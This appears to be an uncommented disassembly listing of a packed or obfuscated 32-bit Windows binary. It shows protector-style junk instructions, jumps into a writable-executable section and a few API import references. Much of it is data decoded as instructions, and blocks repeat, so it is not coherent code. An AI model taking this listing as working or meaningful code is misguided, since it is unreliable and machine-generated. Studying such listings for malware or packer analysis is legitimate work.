sub_4ba0a3
lea esp [ esp + 0x4 ]
je rwxdata
adc si dx
btc ax 0x1
aaa
mov esi edi
clc
cmc
add esi ebx
pushfd
mov [ esp ] ch
pushfd
lea esp [ esp + 0x8 ]
jmp rwxdata
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
sub_4ba21b
mov [ esp ] 0xa5
jmp rwxdata
lea esp [ esp + 0x24 ]
jae rwxdata
jmp rwxdata
jmp rwxdata
push 0xe54feceb
mov [ esp ] 0x9e49
lea esp [ esp + 0x4 ]
call sub_514aff
push 0x73519e81
pushad
adc al al
jmp rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jb rwxdata
pushad
push [ esp + 0x4 ]
mov [ esp + 0x8 ] edi
lea esp [ esp + 0x48 ]
jae rwxdata
call j_sub_5156a9
add [ eax ] al
inc edx
imul esi [ edx + eax * 2 + 0x6c ] 0xe9600074
aad 0xf8
jne rwxdata
pushad
jmp rwxdata
jpe rwxdata
pushfd
stosb [ edi ]
mov [ esp ] 0x54f5
push [ esp ]
lea esp [ esp + 0x8 ]
jmp rwxdata
pushfd
jmp rwxdata
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
lea esp [ esp + 0x24 ]
jne rwxdata
mov ebx [ esi ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
jmp rwxdata
pushad
jmp rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
lea esp [ esp + 0x8 ]
jmp rwxdata
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
stosb [ edi ]
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
js rwxdata
jb rwxdata
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
add al 0xae
jb rwxdata
and al 0x40
je rwxdata
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
jmp rwxdata
jmp rwxdata
and al 0x40
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
jb rwxdata
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
mov bl 0x4a
setb bl
mov bl al
inc ecx
push esi
dec bl
pushfd
inc ecx
add esp 0x8
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
jbe rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
jmp rwxdata
outsb
inc esp
arpl [ gs : edx + 0x79 ] si
jo rwxdata
je rwxdata
jae rwxdata
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
stc
pushfd
call sub_4cd0f5
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
je rwxdata
popad
jo rwxdata
je rwxdata
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
int3
jbe rwxdata
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
mov [ esp + 0x4 ] ch
pushad
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
je rwxdata
outsb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
push [ ebp - 0x8 ]
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
outsb
inc esp
jae rwxdata
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
pushad
jmp rwxdata
jae rwxdata
arpl [ ebp + 0x43 ] sp
popad
jo rwxdata
call sub_514aff
jmp rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
0xda80
je rwxdata
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
outsd
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
in al 0xcf
je rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
or [ ecx + 0x3a ] esp
jo rwxdata
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
mov al [ 0xffffffffae5c8487 ]
dec ebp
aam 0x91
hlt
aad 0x4d
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
push 0x246c8800
add al 0x60
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
pop ds
add [ eax ] al
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
jo rwxdata
call sub_515ff7
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
je rwxdata
jns rwxdata
jne rwxdata
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
arpl [ eax + eax + 0x66 ] si
adc esi edx
btc ax 0x1
aaa
mov esi edi
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
sub_4ba224
dec eax
pushad
cmc
shl eax 0x8
jmp rwxdata
pushfd
jmp rwxdata
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
jmp rwxdata
stc
pushfd
call sub_4cd0f5
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
mov bl 0x4a
setb bl
mov bl al
inc ecx
push esi
dec bl
pushfd
inc ecx
add esp 0x8
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
mov ebx [ esi ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
pushad
jmp rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
js rwxdata
jb rwxdata
and al 0x40
je rwxdata
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
jmp rwxdata
and al 0x40
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
lea esp [ esp + 0x8 ]
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
add al 0xae
jb rwxdata
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
jb rwxdata
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
jbe rwxdata
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
jmp rwxdata
outsb
inc esp
arpl [ gs : edx + 0x79 ] si
jo rwxdata
je rwxdata
jae rwxdata
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
je rwxdata
popad
jo rwxdata
je rwxdata
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
int3
jbe rwxdata
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
mov [ esp + 0x4 ] ch
pushad
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
je rwxdata
outsb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
push [ ebp - 0x8 ]
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
outsb
inc esp
jae rwxdata
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
pushad
jmp rwxdata
jae rwxdata
arpl [ ebp + 0x43 ] sp
